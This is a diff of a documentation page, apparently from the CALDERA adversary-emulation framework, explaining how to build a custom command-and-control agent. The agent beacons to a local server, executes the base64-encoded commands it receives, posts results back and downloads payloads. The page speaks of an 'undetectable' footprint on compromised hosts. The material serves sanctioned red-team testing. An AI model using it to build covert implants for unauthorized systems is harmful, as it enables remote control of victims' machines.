@@ -2,21 +2,29 @@ How to Build Agents
 ================
 
 Building your own agent is a way to create a unique - or undetectable - footprint on compromised machines. Our
-default agent, 54ndc47, is a full representation of what an agent can do. This agent is written in GoLang and offers
-an extensible collection of command-and-control (C2) protocols, such as communicating over HTTP or GitHub Gist. You can
-extend 54ndc47 by adding your own C2 protocols in place or you can follow this guide to create your own agent 
+default agent, 54ndc47, is a representation of what an agent can do. This agent is written in GoLang and offers
+an extensible collection of command-and-control (C2) protocols, such as communicating over HTTP or GitHub Gist. 
+
+You can extend 54ndc47 by adding your own C2 protocols in place or you can follow this guide to create your own agent 
 from scratch.
 
-## Types of agents
+## Understanding contacts
 
-There are 2 unique types of agents. Determining which one you want is your first step:
+Agents are processes which are deployed on compromised hosts and connect with the C2 server periodically for instructions.
+An agent connects to the server through a *contact*, which is a specific connection point on the server.
 
-1) Direct communication between agent-and-server. HTTP communication is an example.
-2) Indirect communication between agent-and-server. Using a trusted 3rd party, like GitHub Gists, is an example.
+There are two types of contacts available:
 
-## Building a direct agent
+1) Active. The server actively polls a location for beacons.
+2) Passive. The server waits for a beacon to come in before acting.
 
-Start by getting a feel for the HTTP(S) agent endpoints, which are located in the rest_api.py module.
+Each contact is defined in an independent Python module and is registered with the contact_svc when the server starts.
+
+There are currently several built-in contacts available: http (passive), tcp (active) and udp (passive). 
+
+## Building an agent: HTTP contact
+
+Start by getting a feel for the HTTP endpoints, which are located in the contacts/contact_http.py module.
 ```
 POST  /beacon 
 POST  /result
@@ -28,6 +36,9 @@ Start by writing a POST request to the /beacon endpoint.
 In your agent code, create a flat JSON dictionary of key/value pairs and ensure the following properties are included
 as keys. Add values which correlate to the host your agent will be running on. Note - all of these properties are
 optional - but you should aim to cover as many as you can.
+
+> If you don't include a platform and executors then the server will never provide instructions to the agent, as it 
+won't know which ones are valid to send. 
 
 | Key           | Value  | Notes |
 | :------------- |:------------- |:-------------|  
@@ -46,11 +57,11 @@ At this point, you are ready to make a POST request with the profile to the /bea
 
 1) The recommended number of seconds to sleep before sending the next beacon
 2) The recommended number of minutes (watchdog) to wait before killing the agent, once the server is unreachable (0 means infinite)
-3) A list of instructions - base64 encoded - which will be empty.
+3) A list of instructions - base64 encoded.
 ```
 profile=$(echo '{"server":"http://127.0.0.1:8888","platform":"darwin","executors":["sh"]}' | base64)
 curl -s -X POST -d $profile localhost:8888/beacon | base64 --decode
-...{"paw": "dcoify", sleep": 59, "watchdog": 0, "instructions": "[]"}
+...{"paw": "dcoify", sleep": 59, "watchdog": 0, "instructions": "[...]"}
 ```
 
 > The paw property returned back from the server represents a unique identifier for your new agent. Each
@@ -61,22 +72,9 @@ You can now navigate to the CALDERA UI, click into the agents tab and view your 
 
 ### Part #2
 
-Start an operation against your agent, selecting to keep the operation alive forever. 
+Now it's time to execute the instructions. 
 
-> If you did not include a platform or executors then the operation will not be able to assign abilities to the agent. 
-
-Re-run the call to /beacon as above, this time including your paw:
-```
-profile=$(echo '{"paw":"dcoify"}' | base64)
-curl -s -X POST -d $profile localhost:8888/beacon | base64 --decode
-...{"paw": "dcoify", sleep": 24, "watchdog": 0, "instructions": "[
-    {"id":"110300-895546","sleep":6,"command":"ZmluZCAvVXNlcnM...", "executor":"sh", "timeout :60, "payload":""},
-    ...
-    ...
-]"}
-```
-
-You should get a full list of instructions, each containing:
+Looking at the previous response, you can see each instruction contains:
 
 * **id**: The link ID associated to the ability
 * **sleep**: A recommended pause to take after running this instruction
@@ -86,7 +84,7 @@ You should get a full list of instructions, each containing:
 * **payload**: A payload file name which must be downloaded before running the command, if applicable
 
 Now, you'll want to revise your agent to loop through all the instructions, executing each command
-and POSTing the shell response to the /result endpoint. You should pause after running each instruction, using the sleep time provided inside the instruction.
+and POSTing the response to the /result endpoint. You should pause after running each instruction, using the sleep time provided inside the instruction.
 ```
 data=$(echo '{"id":$id, "output":$output, "status": $status, "pid":$pid}' | base64)
 curl -s -X POST -d $data localhost:8888/result
@@ -117,5 +115,3 @@ curl -X POST -H "file:$payload" http://localhost:8888/file/download > some_file_
 
 You should implement the watchdog configuration. This property, passed to the agent in every beacon, contains
 the number of minutes to allow a dead beacon before killing the agent. 
-
-
